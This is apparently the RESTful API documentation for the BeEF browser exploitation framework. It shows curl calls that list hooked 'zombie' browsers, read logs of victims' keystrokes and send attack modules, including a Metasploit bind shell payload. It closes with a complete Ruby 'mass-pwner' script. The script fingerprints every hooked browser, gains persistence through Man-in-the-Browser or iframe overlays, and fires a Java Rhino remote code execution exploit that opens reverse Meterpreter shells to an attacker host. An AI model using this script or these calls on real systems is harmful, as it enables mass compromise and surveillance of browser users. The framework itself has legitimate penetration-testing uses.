## Introduction
From version 0.4.3.3 BeEF exposes a RESTful API. All the exchanged data uses the JSON format, for both HTTP responses and HTTP POST requests that have a body. In order to use the API, a _token_ parameter must be always added to requests, otherwise a 401 error (Not Authorized) is returned.

The pseudo-random token is newly generated every time BeEF starts, using `BeEF::Core::Crypto::api_token` 
and is then added to the _BeEF::Configuration_ object. It can be retrieved at any time via ruby using `BeEF::Core::Configuration.instance.get('beef.api_token')`

When BeEF starts, look at the console output for 
`[16:02:47][*] RESTful API key: 320f3cf4da7bf0df7566a517c5db796e73a23f47`. That will be the value of the _token_ parameter

Alternatively, for example if you want to write automated scripts that uses the RESTful API, you can issue a POST request to `/api/admin/login` using the BeEF credentials you will find in the main config.yaml file (beef.credentials).
An example with curl: 
`curl -H "Content-Type: application/json" -X POST -d '{"username":"beef", "password":"beef"}' http://127.0.0.1:3000/api/admin/login`

response: `{"success":true,"token":"8dc651e5ee1cb06003878bb26bd0e72800caeea0"}`

In this way you can parse the JSON response grabbing the token, and use it for your next requests to BeEF.

## Hooked Browsers
**Handler** => /api/hooks
The _hooks_ handler gives information about the hooked browsers, both online and offline.

**Request** => GET /api/hooks

`curl http://beefserver.com:3000/api/hooks?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response**

```json
{
    "hooked-browsers": {
        "online": {
            "0": {
                "name": "FF",
                "version": "10",
                "os": "Intel Mac OS X 10.7",
                "platform": "MacIntel",
                "session": "nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk",
                "ip": "127.0.0.1",
                "domain": "127.0.0.1",
                "port": "3000",
                "page_uri": "http://127.0.0.1:3000/demos/basic.html"
            }
        },
        "offline": {
            "0": {
                "name": "C",
                "version": "17",
                "os": "Macintosh",
                "platform": "MacIntel",
                "session": "26bxiMKoFfOeBgcvIV84qeOsEULKQIEYDH4djMbMPeoAZU4yySMIlJJ7GrAMwuMa0eX9wCKk24KOsCoT",
                "ip": "127.0.0.1",
                "domain": "127.0.0.1",
                "port": "3000",
                "page_uri": "http://127.0.0.1:3000/demos/basic.html"
}}}}
```
In order to retrieve relative hooked browser details (like enabled plugins and technologies, cookies, screen size and additional info), we must specify the unique session id that identified the browser in the BeEF framework. This information can be found from the previous _/api/hooks_ call: the _session_ key value.

**Request** => GET /api/hooks/:session

`curl http://beefserver.com:3000/api/hooks/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response**

```json
{ "BrowserName" : "O",
  "BrowserPlugins" : "Shockwave Flash\nJava Applet Plug-in\nQuickTime Plug-in 7.7.1\nSharePoint Browser Plug-in\nSilverlight Plug-In\nWebEx64 General Plugin Container",
  "BrowserReportedName" : "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.3; U; en) Presto/2.10.229 Version/11.62",
  "BrowserType" : "{"O11":true,"O":true}",
  "BrowserVersion" : "11",
  "Cookies" : "BEEFHOOK=nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk",
  "HasActiveX" : "No",
  "HasFlash" : "Yes",
  "HasGoogleGears" : "No",
  "HasWebSocket" : "No",
  "HostName" : "127.0.0.1",
  "JavaEnabled" : "Yes",
  "OsName" : "Macintosh",
  "PageReferrer" : "No Referrer",
  "PageTitle" : "BeEF Basic Demo",
  "PageURI" : "http://127.0.0.1:3000/demos/basic.html",
  "ScreenParams" : "{"width"=>1680, "height"=>1050, "colordepth"=>32}",
  "SystemPlatform" : "MacIntel",
  "VBScriptEnabled" : "No",
  "WindowSize" : "{"width"=>1000, "height"=>729}",
  "hasPersistentCookies" : "Yes",
  "hasSessionCookies" : "Yes"
}
```

## Logs
**Handler** => /api/logs
The _logs_ handler gives information about hooked browser logs, both global and relative ones.

**Request** => GET /api/logs

`curl http://beefserver.com:3000/api/logs?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response (snip)**

```json
{
    "logs_count": 8,
    "logs": [
        {
            "id": 1,
            "date": "2012-03-20T16:14:11+01:00",
            "event": "127.0.0.1 just joined the horde from the domain: 127.0.0.1:3000",
            "type": "Zombie"
        },
        {
            "id": 8,
            "date": "2012-03-20T16:18:27+01:00",
            "event": "19.092s - [Focus] Browser has regained focus.",
            "type": "Event"
        }
    ]
}
```

In order to retrieve relative hooked browser logs, so events that are logged for a specific browser, we must specify the unique session id that identified the browser in the BeEF framework. This information can be found from the previous _/api/hooks_ call: the _session_ key value.

**Request** => GET /api/logs/:session

`curl http://beefserver.com:3000/api/logs/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response (snip)**

```json
{
    "logs_count": 13,
    "logs": [
        {
            "id": 1,
            "date": "2012-03-20T16:14:11+01:00",
            "event": "127.0.0.1 just joined the horde from the domain: 127.0.0.1:3000",
            "type": "Zombie"
        },
        {
            "id": 16,
            "date": "2012-03-20T16:40:18+01:00",
            "event": "6.071s - [User Typed] "an" > input#imptxt(Important Text)",
            "type": "Event"
        },
        {
            "id": 17,
            "date": "2012-03-20T16:40:19+01:00",
            "event": "7.086s - [User Typed] "tisnatc" > input#imptxt(Important Text)",
            "type": "Event"
        },
        {
            "id": 18,
            "date": "2012-03-20T16:40:20+01:00",
            "event": "8.099s - [User Typed] "hor" > input#imptxt(Important Text)",
            "type": "Event"
        }
    ]
}
```
## Command Modules
**Handler** => /api/modules
The _modules_ handler do multiple things:

**===List all available and enabled command modules===**

**Request** => GET /api/modules

`curl http://beefserver.com:3000/api/modules?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response (snip)**

```json
{
    "0": {
        "id": 1,
        "name": "Linksys WRT54G CSRF",
        "category": "Router"
    },
    "65": {
        "id": 69,
        "name": "Redirect Browser (Rickroll)",
        "category": "Browser"
    },
    "66": {
        "id": 70,
        "name": "Replace Videos",
        "category": "Browser"
    },
    "67": {
        "id": 71,
        "name": "Create Prompt Dialog",
        "category": "Browser"
    }
}
```
**===Return information about a specified module (description, category, input options)===**

**Request** => GET /api/modules/:module_id

`curl http://beefserver.com:3000/api/modules/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response**

```json
{
    "name": "prompt_dialog",
    "description": "Sends a prompt dialog to the hooked browser.",
    "category": "Browser",
    "options": [
        {
            "name": "question",
            "description": "Prompt text",
            "ui_label": "Prompt text"
        }
    ]
}
```
**===Send a command module to the specified hooked browser===**

NOTE: the request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON. In the following example we send the _prompt-dialog_ command module: according to the previous _/api/modules/71_ call, we can specify the _question_ input with our custom value. 

**Request** => POST /api/modules/:session/:module_id

`curl -H "Content-Type: application/json; charset=UTF-8" -d '{"question":"wtf?"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response**

```json
{
    "success": "true",
    "command_id": "1"
}
```
**===Return information about the specific command module previously executed===**

Reusing the previous example, we want to know the command module execution results (or, what the victim entered to the prompt dialog). In this case the victim entered _don't know_ :D

**Request** => GET /api/modules/:session/:mod_id/:cmd_id

`curl http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71/1?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response**

```json
{
    "date": "1332260323",
    "data": "{"data":"answer=don't know"}"
}
```
**===Send a Metasploit module===**

NOTE: the request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON. In the following example we send the _Adobe FlateDecode Stream Predictor 02 Integer Overflow_. Metasploit modules will be listed together with BeEF modules, marked with the _metasploit_ category.

**Request** => POST /api/modules/:session/:module_id

`curl -H "Content-Type: application/json; charset=UTF-8" -d '{"SRVPORT":"3992", "URIPATH":"77345345345dg", "PAYLOAD":"generic/shell_bind_tcp"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/236?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response**

NOTE: in this case we cannot query BeEF nor Metasploit if module execution was successful or not.
This is why there is "command_id":"not_available" in the response.

```json
{
    "success": "true",
    "command_id": "not_available"
}
```
## A real example: Java 1.6.0u27 mass-pwner 
Screencast here: http://vimeo.com/41644329
```ruby
#
#   Copyright 2012 Michele Orru michele.orru@antisnatchor.com
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
# Java 1.6.0u27 mass-pwner
# - run metasploit (./msfconsole -r ../BeEF.rc)
# - get browser plugins
# - get OS type and browser type/version
# - in order to achieve persistence:
#   - if the hooked browser is IE launch the iFrame above,
#   - otherwise MitB
# - launch get_system_info if java version is not exposed by plugins
# - retrieve exact version of the JDK
# - if JDK is vulnerable -> launch Rhino RCE exploit (reverse Java meterpreter)
require 'rest_client'
require 'json'

# RESTful API root endpoints
ATTACK_DOMAIN = "192.168.0.40"
RESTAPI_HOOKS = "http://" + ATTACK_DOMAIN + ":3000/api/hooks"
RESTAPI_LOGS = "http://" + ATTACK_DOMAIN + ":3000/api/logs"
RESTAPI_MODULES = "http://" + ATTACK_DOMAIN + ":3000/api/modules"
RESTAPI_ADMIN = "http://" + ATTACK_DOMAIN + ":3000/api/admin"

BEEF_USER = "beef"
BEEF_PASSWD = "beef"
# we also assume that BeEF and Metasploit are on the same host.
# be sure to have "host" and "callback_host" in extensions/metasploit/config.yaml
# with the same value of ATTACK_DOMAIN

@token = nil
@modules = nil
@hooks = nil
@meterpreter_lport = 10666

def print_banner
  puts "[>>>] JDK <= 1.6.0_27 mass pwner]"
  puts "[>>>] uses BeEF RESTful API to control mass zombies"
  puts "[>>>] BeEF persistence techniques used: Mitb/iframe_above"
  puts "[>>>] MSF Rhino RCE is used to pwn the host if the detected version of Java is vulnerable"
  puts "[>>>] [by AntiSnatchOr - 2012]"

end

def auth
  response = RestClient.post "#{RESTAPI_ADMIN}/login",
                             { 'username' => "#{BEEF_USER}",
                               'password' => "#{BEEF_PASSWD}"}.to_json,
                             :content_type => :json,
                             :accept => :json
  result = JSON.parse(response.body)
  @token = result['token']
  puts "[+] Retrieved RESTful API token: #{@token}"
end

def hooks
  response = RestClient.get "#{RESTAPI_HOOKS}", {:params => {:token => @token}}
  result = JSON.parse(response.body)
  @hooks = result["hooked-browsers"]["online"]
  puts "[+] Retrieved Hooked Browsers list. Online: #{@hooks.size}"
end

def modules
  response = RestClient.get "#{RESTAPI_MODULES}", {:params => {:token => @token}}
  @modules = JSON.parse(response.body)
  puts "[+] Retrieved #{@modules.size} available command modules"
end

################# HELPERS #########################
def get_module_id(mod_name)
  @modules.each do |mod|
    #normal modules
    if mod_name == mod[1]["class"]
      return mod[1]["id"]
      break
      # metasploit modules
    else if mod[1]["class"] == "Msf_module" && mod_name == mod[1]["name"]
           return mod[1]["id"]
           break
         end
    end
  end
end

def random_string(length)
  chars = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ'
  result = ''
  length.times { result << chars[rand(chars.size)] }
  result
end
#//////////////////// HELPERS ///////////////////////#

def get_java_version(session)
  response = RestClient.get "#{RESTAPI_HOOKS}/#{session}", {:params => {:token => @token}}
  result = JSON.parse(response.body)
  java_version = nil
  if result['JavaEnabled'] == "Yes"
    puts "[+] Retrieving exact version of Java for Hooked Browser [#{session}]"
    mod_id = get_module_id("Get_system_info")
    response = RestClient.post "#{RESTAPI_MODULES}/#{session}/#{mod_id}?token=#{@token}", {}.to_json,
                               :content_type => :json,
                               :accept => :json
    result = JSON.parse(response.body)
    cmd_id = result['command_id']
    puts "[+] Get_system_info module with command id ##{cmd_id} sent."
    java_version = poll_for_command_results(session, mod_id, cmd_id).split("Java Version: ")[1]
    puts "[+] Get_system_info module with command id ##{cmd_id} executed. Java Version: #{java_version}"
  end
  java_version
end

def poll_for_command_results(session, mod, cmd_id)
  timeout = 30
  java_version = ""
  while timeout > 0 do
    begin
      response = RestClient.get "#{RESTAPI_MODULES}/#{session}/#{mod}/#{cmd_id}", {:params => {:token => @token}}
      result = JSON.parse(response.body)
      data = JSON.parse(result["data"])["data"]
      puts "[-] Cool, got results...parsing them."
      java_version = data[data.index("Java Version: "),22] # return something like "Java Version: 1.6.0_31"
      break
    rescue RestClient::ResourceNotFound  # no response yet...continue until timeout
      puts "[-]No results yet."
      timeout -= 2
      sleep 2
    end
  end
  java_version
end

def pwn_hooks_with_vuln_java
  @windows_hooks = []
  @hooks.each do |hook|
    session = hook[1]["session"]
    browser = "#{hook[1]["name"]}-#{hook[1]["version"]}"

    #The Man-in-the-Browser module is still not supported in IE, so we use the overlay iframe_above module
    if browser.match(/^IE/)
      mod_id = get_module_id("Iframe_above")
      send_iframe_above_module(session, mod_id)
      puts "[+] Hooked browser is [#{browser}]...achieving persistence with iFrame Above module..."
    else
      mod_id = get_module_id("Man_in_the_browser")
      send_mitb_module(session, mod_id)
      puts "[+] Hooked browser is [#{browser}]...achieving persistence with Man In The Browser module..."
    end

    sleep 2
    java_version = get_java_version(session)
    if java_version == nil
      puts "[--] Skipping HookedBrowser [#{browser}]. Java not enabled."
      next
    end
    if java_version == "1.6.0_27" || java_version.split("1.6.0_")[1].to_i < 27
      puts "[+] Java version [#{java_version}] IS vulnerable to Rhino Script Engine RCE exploit. Sending malicious applet..."
      mod_id = get_module_id("Java Applet Rhino Script Engine Remote Code Execution")
      send_msf_module(session, mod_id, "java/meterpreter/reverse_http")
      puts "[+] Exploit [Java Applet Rhino Script Engine RCE] sent. Check your MSFconsole :D"
    else
      puts "[+] Java version [#{java_version}] IS NOT vulnerable to Rhino Script Engine RCE exploit. Skipping Hooked Browser."
    end
  end
end

def send_mitb_module(session, mod_id)
  RestClient.post "#{RESTAPI_MODULES}/#{session}/#{mod_id}?token=#{@token}", {}.to_json,
                             :content_type => :json,
                             :accept => :json
end

def send_iframe_above_module(session, mod_id)
  RestClient.post "#{RESTAPI_MODULES}/#{session}/#{mod_id}?token=#{@token}",
                             {}.to_json,
                             :content_type => :json,
                             :accept => :json
end

def send_msf_module(session, mod_id, payload)
  RestClient.post "#{RESTAPI_MODULES}/#{session}/#{mod_id}?token=#{@token}",
                             {"SRVHOST" => "#{ATTACK_DOMAIN}",
                              "SRVPORT" => "8080",
                              "URIPATH" => random_string(10),
                              "PAYLOAD" => payload,
                              "LHOST" => "#{ATTACK_DOMAIN}",
                              "LPORT" => @meterpreter_lport
                             }.to_json,
                             :content_type => :json,
                             :accept => :json
  @meterpreter_lport += 1
  sleep 5
end

print_banner
# Retrieve the RESTful API token
auth
# Retrieve online hooked browsers
hooks
# Retrieve available modules
modules
# Filter hooked browsers selecting only those with Java Enabled, then:
# - in order to achieve persistence, if the hooked browser is IE launch the iFrame above, otherwise MitB
# - launch get_system_info module to retrieve the exact version of Java
# - if java is 1.6.0_27 or lower, launch the Rhino RCE exploit
pwn_hooks_with_vuln_java
```